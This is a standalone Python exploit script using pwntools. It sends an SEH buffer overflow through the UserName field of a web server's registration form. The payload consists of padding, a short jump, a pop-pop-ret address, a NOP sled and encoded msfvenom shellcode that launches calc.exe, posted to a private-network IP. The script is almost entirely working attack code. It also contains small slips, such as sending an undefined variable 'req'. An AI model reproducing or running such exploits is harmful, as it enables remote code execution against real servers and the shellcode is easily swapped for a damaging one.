#!/usr/bin/env python3

from pwn import *


size = 1000
lpad = b'\x41' * 217
nops = b'\x90' * 16

jump = b'\x90\x90\xeb\x06' # nop; nop; jmp 0x8;

# msfvenom -p windows/exec -b '\x00' -f py CMD=calc.exe EXITFUNC=seh -e x86/alpha_mixed
shellcode =  b"\x89\xe5\xdd\xc6\xd9\x75\xf4\x5d\x55\x59\x49\x49\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
shellcode += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
shellcode += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
shellcode += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x78\x68\x6b"
shellcode += b"\x32\x43\x30\x35\x50\x63\x30\x43\x50\x4f\x79\x38\x65"
shellcode += b"\x70\x31\x39\x50\x73\x54\x4e\x6b\x30\x50\x34\x70\x4c"
shellcode += b"\x4b\x43\x62\x36\x6c\x4e\x6b\x56\x32\x47\x64\x6e\x6b"
shellcode += b"\x61\x62\x36\x48\x56\x6f\x6d\x67\x71\x5a\x56\x46\x56"
shellcode += b"\x51\x6b\x4f\x6e\x4c\x67\x4c\x35\x31\x63\x4c\x43\x32"
shellcode += b"\x56\x4c\x55\x70\x4f\x31\x5a\x6f\x54\x4d\x37\x71\x48"
shellcode += b"\x47\x4a\x42\x78\x72\x51\x42\x71\x47\x4e\x6b\x71\x42"
shellcode += b"\x36\x70\x4c\x4b\x71\x5a\x37\x4c\x4c\x4b\x50\x4c\x74"
shellcode += b"\x51\x51\x68\x6b\x53\x32\x68\x37\x71\x6e\x31\x62\x71"
shellcode += b"\x4e\x6b\x43\x69\x55\x70\x65\x51\x39\x43\x4c\x4b\x47"
shellcode += b"\x39\x36\x78\x79\x73\x65\x6a\x77\x39\x4c\x4b\x66\x54"
shellcode += b"\x6e\x6b\x35\x51\x7a\x76\x50\x31\x69\x6f\x6c\x6c\x49"
shellcode += b"\x51\x38\x4f\x66\x6d\x73\x31\x48\x47\x45\x68\x69\x70"
shellcode += b"\x31\x65\x4b\x46\x67\x73\x63\x4d\x4c\x38\x57\x4b\x31"
shellcode += b"\x6d\x47\x54\x42\x55\x69\x74\x50\x58\x6c\x4b\x36\x38"
shellcode += b"\x75\x74\x45\x51\x38\x53\x75\x36\x4e\x6b\x66\x6c\x72"
shellcode += b"\x6b\x4e\x6b\x46\x38\x45\x4c\x33\x31\x6b\x63\x6c\x4b"
shellcode += b"\x43\x34\x4e\x6b\x47\x71\x6a\x70\x4c\x49\x47\x34\x31"
shellcode += b"\x34\x77\x54\x73\x6b\x51\x4b\x71\x71\x56\x39\x70\x5a"
shellcode += b"\x43\x61\x79\x6f\x49\x70\x43\x6f\x71\x4f\x33\x6a\x6c"
shellcode += b"\x4b\x32\x32\x7a\x4b\x6c\x4d\x63\x6d\x31\x7a\x53\x31"
shellcode += b"\x6e\x6d\x4f\x75\x38\x32\x55\x50\x57\x70\x37\x70\x72"
shellcode += b"\x70\x45\x38\x64\x71\x4c\x4b\x30\x6f\x4d\x57\x6b\x4f"
shellcode += b"\x59\x45\x4f\x4b\x6b\x4e\x74\x4e\x55\x62\x78\x6a\x55"
shellcode += b"\x38\x39\x36\x6f\x65\x4f\x4d\x4d\x4d\x4b\x4f\x4e\x35"
shellcode += b"\x35\x6c\x67\x76\x63\x4c\x45\x5a\x6b\x30\x6b\x4b\x69"
shellcode += b"\x70\x32\x55\x45\x55\x4d\x6b\x33\x77\x64\x53\x30\x72"
shellcode += b"\x62\x4f\x51\x7a\x45\x50\x46\x33\x49\x6f\x38\x55\x75"
shellcode += b"\x33\x71\x71\x30\x6c\x52\x43\x36\x4e\x73\x55\x71\x68"
shellcode += b"\x30\x65\x73\x30\x41\x41"

rpad = b'A'*(size - len(lpad) - 4 - 4 - len(nops) - len(shellcode))

payload = flat(
    lpad,
    jump,
    p32(0x100103c0), # pop edi, pop esi; ret;
    nops,
    shellcode,
    rpad
)

body = flat(
    b'UserName=%s' % payload,
    b'&Password=A',
    b'&Password1=A',
    b'&Sex=1',
    b'&Email=A@',
    b'&Icon=A.gif',
    b'&Resume=A',
    b'&cw=1',
    b'&RoomID=4'
    b'&RepUserName=admin',
    b'&submit1=Register'
)

request = flat(
    'POST /registresult.htm HTTP/1.1\r\n',
    'Host: 192.168.122.186\r\n',
    'User-Agent: curl/7.58.0\r\n',
    'Accept: */*\r\n',
    'Connection: close\r\n',
    'Content-Type: application/x-www-form-urlencoded\r\n',
    'Referer: http://192.168.1.11\r\n',
    '\r\n',
    body
)

with remote('192.168.122.186', 80) as r:
    r.writeline(req)

